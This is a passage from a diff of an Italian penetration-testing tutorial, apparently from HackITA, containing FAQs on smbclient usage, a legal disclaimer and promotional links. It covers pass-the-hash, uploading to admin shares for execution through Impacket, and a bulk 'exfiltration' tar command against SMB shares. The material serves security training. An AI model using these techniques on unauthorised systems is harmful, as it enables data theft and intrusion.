+
+Smbclient è un client completo per interazione diretta con share, mentre enum4linux è uno script wrapper che automatizza enumerazione usando multipli tool (incluso smbclient). Smbclient offre controllo granulare, enum4linux automatizza discovery.
+
+**Posso usare smbclient per eseguire comandi remoti?**
+
+Smbclient non esegue comandi arbitrari direttamente. Puoi caricare file su share amministrative (C$, ADMIN$) ma l'esecuzione richiede tool aggiuntivi come psexec, wmiexec o smbexec della suite Impacket.
+
+**Il pass-the-hash con smbclient funziona su tutti i sistemi Windows?**
+
+Funziona su sistemi che accettano autenticazione NTLM. Windows moderni con mitigazioni patch KB2871997 applicata possono bloccare PTH su account locali (eccetto RID 500). Funziona sempre su account di dominio.
+
+**Come posso evitare che le password appaiano nella command history?**
+
+Usa file credenziali con `--password-file` oppure imposta la variabile d'ambiente `PASSWD` prima di eseguire smbclient. Mai usare formato `user%password` in script.
+
+**Smbclient supporta SMB signing e encryption?**
+
+Sì. SMB signing è supportato automaticamente se richiesto dal server. SMB3 encryption è supportata nelle versioni recenti. Usa `--client-protection=encrypt` per forzare encryption.
+
+**Perché ricevo "protocol negotiation failed" anche con credenziali corrette?**
+
+Probabilmente c'è mismatch tra versioni protocollo supportate. Windows moderni disabilitano SMB1 per sicurezza. Usa `-m SMB2` o `-m SMB3` per forzare protocolli moderni, oppure `--option='client min protocol=NT1'` per legacy.
+
+**Posso automatizzare smbclient in script bash per assessment massivi?**
+
+Assolutamente sì. Usa modalità non-interattiva con `-c` per singoli comandi. Per operazioni complesse, crea file di comandi e usa redirection: `smbclient //target/share -U user < commands.txt`.
+
+**Come gestisco share con spazi nel nome?**
+
+Usa quote: `smbclient '//target/Share Name' -U user` oppure escape: `smbclient //target/Share\ Name -U user`.
+
+**Smbclient logga le attività da qualche parte?**
+
+Di default no. Usa redirection per logging: `smbclient [...] 2>&1 | tee session.log` oppure incrementa debug level `-d 3` per output verboso.
+
+**Qual è la migliore pratica per exfiltration massiva durante un pentest?**
+
+Usa tar mode per efficienza: `smbclient //target/share -U user -Tc exfil.tar '*'`. Questo crea un singolo archivio, riducendo numero di connessioni e facilitando analisi post-assessment.
 
 ***
 
-## 🌍 Riferimenti Tecnici Ufficiali (max 3)
+**Disclaimer Legale:** Smbclient è uno strumento legittimo per amministrazione sistemi e penetration testing autorizzato. L'utilizzo non autorizzato su reti e sistemi non di proprietà costituisce reato penale. Ottenere sempre permesso esplicito scritto prima di condurre assessment di sicurezza. Questo contenuto è esclusivamente educativo per professionisti della sicurezza informatica.
 
-* [https://www.samba.org/samba/docs/current/man-html/smbclient.1.html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
-* [https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145)
-* [https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always)
+## HackITA — Supporta la Crescita della Formazione Offensiva
+
+Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:
+
+👉 [https://hackita.it/supporta](https://hackita.it/supporta)
+
+Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.
+
+***
+
+## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?
+
+Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:
+
+👉 [https://hackita.it/servizi](https://hackita.it/servizi)
+
+Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
